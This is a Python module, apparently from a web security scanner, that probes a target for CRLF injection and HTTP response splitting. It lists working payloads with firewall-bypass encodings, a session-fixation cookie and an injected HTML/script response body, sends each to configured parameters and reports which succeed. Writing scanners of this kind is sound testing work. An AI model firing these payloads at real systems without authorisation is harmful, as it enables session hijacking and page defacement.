from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_crlf_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    HTTP Response Splitting / CRLF Injection.
    Injects %0d%0a to see if we can set arbitrary headers.
    """
    payloads = [
         # 1. Basic Header Injection (Standard)
         {"val": "valid\r\nX-Injected: true", "desc": "Header Injection (Standard)"},
         {"val": "valid%0d%0aX-Injected: true", "desc": "Header Injection (Percent)"},
         
         # 2. WAF Bypass (Encoding/Obfuscation)
         {"val": "valid%0aX-Injected: true", "desc": "LF Only (Line Feed)"},
         {"val": "valid%0dX-Injected: true", "desc": "CR Only (Carriage Return)"},
         {"val": "valid%250d%250aX-Injected: true", "desc": "Double Encoded CRLF"},
         {"val": "valid%%0d0aX-Injected: true", "desc": "Nested Encoding"},
         {"val": "valid%u000d%u000aX-Injected: true", "desc": "Unicode CRLF"},
         {"val": "valid%E5%98%8A%E5%98%8DX-Injected: true", "desc": "UTF-8 Overlong"},
         
         # 3. Session Fixation (Destructive)
         {"val": "valid\r\nSet-Cookie: SESSIONID=HACKED_BY_BP", "desc": "Session Fixation (Raw)"},
         {"val": "valid%0d%0aSet-Cookie: SESSIONID=HACKED_BY_BP", "desc": "Session Fixation (Encoded)"},

         # 4. HTTP Response Splitting (Payload + WAF Bypass)
         {"val": "valid\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><script>alert(1)</script>HACKED</html>", "desc": "Response Splitting (Standard)"},
         {"val": "valid%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>HACKED</html>", "desc": "Response Splitting (Encoded)"}
    ]
    
    fields = scenario.config.get("fields", ["url", "redirect", "lang"])
    issues = []
    leaked_data = []
    
    for field in fields:
        for item in payloads:
            p = item["val"]
            desc = item["desc"]
            
            params = {field: p}
            # Also try injecting in path if needed, but params is standard
            
            try:
                resp = client.send(scenario.method, scenario.target, params=params)
                
                # Check for Server Breakage
                if resp.status_code >= 500:
                     issues.append(f"[CRITICAL] CRLF Caused Server Error/Crash ({desc})")
                     continue # Skip other checks if crashed
                
                # Check for Header Set
                # Note: requests might merge headers, so we check existence
                if resp.headers.get("X-Injected") == "true":
                     issues.append(f"[CRITICAL] CRLF Header Injection Confirmed ({desc})")
                     leaked_data.append(f"Header Found: X-Injected: {resp.headers.get('X-Injected')}")
                     
                # Check for Cookie Injection
                # We need to look at raw headers or specific cookie jar if requests parsed it
                # Simply checking headers string repr or set-cookie value
                set_cookie = resp.headers.get("Set-Cookie", "")
                if "HACKED_BY_BP" in set_cookie:
                     issues.append(f"[CRITICAL] CRLF Session Fixation Successful")
                     leaked_data.append(f"Set-Cookie Header: ...{set_cookie[:50]}...")
                
                # Check for Defacement (Body content logic)
                # If we split the response, the body should contain our HTML
                if "HACKED" in resp.text and "<script>alert(1)</script>" in resp.text:
                     issues.append(f"[CRITICAL] HTTP Response Splitting (Defacement) Successful")
                     leaked_data.append(f"Injected Body Snippet: ...{resp.text[:100]}...")
                     
            except Exception:
                pass # Network error might mean crash too?
                
    return {
        "scenario_id": scenario.id,
        "attack_type": "crlf_injection",
        "passed": len(issues) == 0,
        "details": {"issues": issues, "leaked_data": leaked_data}
    }
